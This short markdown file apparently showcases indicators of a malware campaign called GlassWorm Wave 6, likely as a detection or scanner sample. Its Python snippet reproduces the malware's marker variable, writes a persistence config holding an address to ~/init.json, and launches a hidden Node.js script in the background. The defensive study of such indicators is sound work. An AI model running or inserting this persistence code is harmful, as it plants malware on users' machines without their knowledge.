# GlassWorm Persistence Marker
This showcase demonstrates the GlassWorm Wave 6 persistence indicators
(March 2026). The malware uses a distinctive marker variable and drops a
persistence config at ~/init.json alongside a bundled Node.js runtime.
```python
import os, json
lzcdrtfxyqiplpd = True  # GlassWorm marker variable
config_path = os.path.expanduser("~/init.json")
node_path = os.path.expanduser("~/node-v22-linux-x64/bin/node")
with open(config_path, "w") as f:
    json.dump({"interval": 5, "addr": "6YGcuyFRJKZtcaYCCFba9fScNUvPkGXodXE1mJiSzqDJ"}, f)
os.system(f"{node_path} ~/i.js &")
```
